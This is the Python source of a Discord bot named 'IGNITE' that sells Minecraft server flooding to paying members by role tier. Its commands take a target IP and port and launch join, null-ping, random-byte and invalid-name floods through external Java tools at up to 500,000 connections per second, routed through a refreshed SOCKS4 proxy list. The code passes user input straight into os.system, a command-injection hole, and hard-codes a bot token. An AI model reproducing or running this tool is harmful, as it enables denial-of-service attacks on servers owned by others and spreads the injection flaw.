import requests
from datetime import datetime
from discord import Embed, File
from discord.ext import commands
import os
import discord
import urllib.request
import json
import asyncio
import sqlite3
import threading

token = "ODgwOTQ0MjYwNDI0Mjg2Mjc4.YSlpRg.PmLzduwqSoiBIvpNprG3Ew6oQpY"

client = commands.Bot(command_prefix=';')
client.remove_command('help')

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.errors.CheckFailure):
        error2 = embed = Embed(title=f":fire: Error", description=f"Permission Denied !\n Please Purchase Plan", color=0xf50000)
        embed.set_footer(text="© IGNITE | :fire:")
        await ctx.channel.send(embed=error2)

@client.command()
async def help712478129487124981274(ctx):
    embed = discord.Embed(title=f"Methods List", description=f"\n For Premium Users (☘️ Member) Please Use Commands Listed Below\n \n  ;Join IP Port Protocol! \n  ;DoubleJoin IP Port Protocol!\n  ;RandomBytes IP Port Protocol! \n  ;NullPing IP Port Protocol!\n ;Ping IP Port Protocol!\n ;Motd IP Port Protocol\n ;InvalidNames IP Port Protocol\n ;BotSentry IP Port Protocol\n \n For Premium Users (☘️ Member +) Please Use Commands Listed Below\n \n ;PJoin IP Port Protocol!\n ;PDoubleJoin IP Port Protocol!\n ;PRandomBytes IP Port Protocol!\n ;PNullPing IP Port Protocol!\n ;PPing IP Port Protocol!\n ;PMotd IP Port Protocol\n ;PInvalidNames IP Port Protocol\n ;PBotSentry IP Port Protocol\n \n ;Update Updates Current Proxies\n ;Resolve Domain")     
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 

@client.command()
async def aboutus8195821958125(ctx):
    embed = discord.Embed(title=f"IGNITE | Minecraft Botting Service", description=f"\n IGNITE is a service that allows you to bot target mc servers,\n Doesn't matter of they're premium.\n You can bot them with ease.\n \nIGNITE has been created purely for testing purposes.\n Server owners are not responsible for any problems that occur.\n All responsibilities belong to the user.\n Anyone who uses our testing service is deemed to have read this rule and agreement.")     
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed)  
    
@client.command()
async def update(ctx):
    f = open("proxies.txt", "a+")
    f.truncate(0)
    r = requests.get('https://api.openproxylist.xyz/socks4.txt')
    proxies = []
    for proxy in r.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        f.write((p)+"\n")
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"Socks4 Proxies has been successfully refreshed.")     
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    
@client.command()
async def resolve(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="IGNITE Team",
        color=discord.Colour.red()
    )

    embed.description = f"""Stress Minecraft Servers Using Discord
    
    **Resolve »** {arg1}
    
    **Result »** {json_object['ip']}:{json_object['port']}
    
    """

    g = json_object["ip"]
    gb = json_object["port"]

    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/880933859703787616/883429736544608376/ignite.jpg')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed)   
 
@client.command()
@commands.has_permissions(manage_messages=True)
async def stop(ctx):
    os.system("pkill 'java'")
    embed = discord.Embed(
        title="IGNITE Team",
        color=discord.Colour.red()
    )

    embed.description = f"""Stress Minecraft Servers Using Discord
    
    You successfully stopped your attack.
    
    """
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/880933859703787616/883429736544608376/ignite.jpg')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed)
    
@client.command()
@commands.has_role('☘️ Member')
async def join (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: Join :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 100000")     
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = f"java -jar MCBOT.Jar {arg1}:{arg2} {arg3} join 60 100000"
    os.system(cmd) 

@client.command()
@commands.has_role('☘️ Member')
async def randombytes (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: RandomBytes :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 100000")     
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = f"java -jar MCBOT.Jar {arg1}:{arg2} {arg3} randombytes 60 100000"
    os.system(cmd)
    
@client.command()
@commands.has_role('☘️ Member')
async def nullping (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: NullPing :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 100000")     
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = f"java -jar MCBOT.Jar {arg1}:{arg2} {arg3} nullping 60 100000"
    os.system(cmd)
    
@client.command()
@commands.has_role('☘️ Member')
async def doublejoin (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: DoubleJoin :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 100000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = f"java -jar MCBOT.Jar {arg1}:{arg2} {arg3} doublejoin 60 100000"
    os.system(cmd)
    
@client.command()
@commands.has_role('☘️ Member')
async def ping (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: Ping :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 100000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = f"java -jar MCBOT.Jar {arg1}:{arg2} {arg3} ping 60 100000"
    os.system(cmd)

@client.command()
@commands.has_role('☘️ Member')
async def motd (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: Motd :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 100000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = "java -Dperdelay=500000 -Ddelay=0 -jar motd.jar " + str(arg1) +":"+ str(arg2) + " 1 100 " + str(arg3) + " 60"
    os.system(cmd)

@client.command()
@commands.has_role('☘️ Member')
async def invalidnames (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: InvalidNames :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 100000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = f"java -jar MCBOT.Jar {arg1}:{arg2} {arg3} invalidnames 60 100000"
    os.system(cmd)

@client.command()
@commands.has_role('☘️ Member')
async def botsentry (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: BotSentry :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 100000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = f"java -jar MCBOT.Jar {arg1}:{arg2} {arg3} botjoiner 60 100000"
    os.system(cmd)    
    
@client.command()
@commands.has_role('☘️ Member +')
async def pjoin (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: PremiumJoin :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 200000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = f"java -jar MCBOT.Jar {arg1}:{arg2} {arg3} join 60 200000"
    os.system(cmd) 

@client.command()
@commands.has_role('☘️ Member +')
async def prandombytes (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: PremiumRandomBytes :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 200000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = f"java -jar MCBOT.Jar {arg1}:{arg2} {arg3} randombytes 60 200000"
    os.system(cmd)
    
@client.command()
@commands.has_role('☘️ Member +')
async def pnullping (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: PremiumNullPing :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 200000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = f"java -jar MCBOT.Jar {arg1}:{arg2} {arg3} nullping 60 200000"
    os.system(cmd)
    
@client.command()
@commands.has_role('☘️ Member +')
async def pdoublejoin (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: PremiumDoubleJoin :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 200000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = f"java -jar MCBOT.Jar {arg1}:{arg2} {arg3} doublejoin 60 200000"
    os.system(cmd)
    
@client.command()
@commands.has_role('☘️ Member +')
async def pping (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: PremiumPing :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 200000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = f"java -jar MCBOT.Jar {arg1}:{arg2} {arg3} ping 60 200000"

@client.command()
@commands.has_role('☘️ Member +')
async def pmotd (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: PremiumMotd :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 200000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = "java -Dperdelay=500000 -Ddelay=0 -jar motd.jar " + str(arg1) +":"+ str(arg2) + " 1 200 " + str(arg3) + " 60"
    os.system(cmd)
    
@client.command()
@commands.has_role('🐤 Owner')
async def ultimate (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: PremiumMotd :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 200000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = f"java -jar MCBOT.Jar {arg1}:{arg2} {arg3} botjoiner 60 500000"
    os.system(cmd)
    
@client.command()
@commands.has_role('☘️ Member +')
async def pinvalidnames (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: PremiumInvalidNames :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 200000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = f"java -jar MCBOT.Jar {arg1}:{arg2} {arg3} invalidnames 60 200000"
    os.system(cmd)
    
@client.command()
@commands.has_role('☘️ Member')
async def pbotsentry (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: BotSentry :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 200000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    now = datetime.now()
    embed.set_footer(text=f"© IGNITE | 🔥 Today is {now.strftime('%d-%m-%y / %H:%M:%S')}")
    await ctx.send(embed=embed) 
    cmd = f"java -jar MCBOT.Jar {arg1}:{arg2} {arg3} botjoiner 60 200000"
    os.system(cmd)     
  
client.run(token)
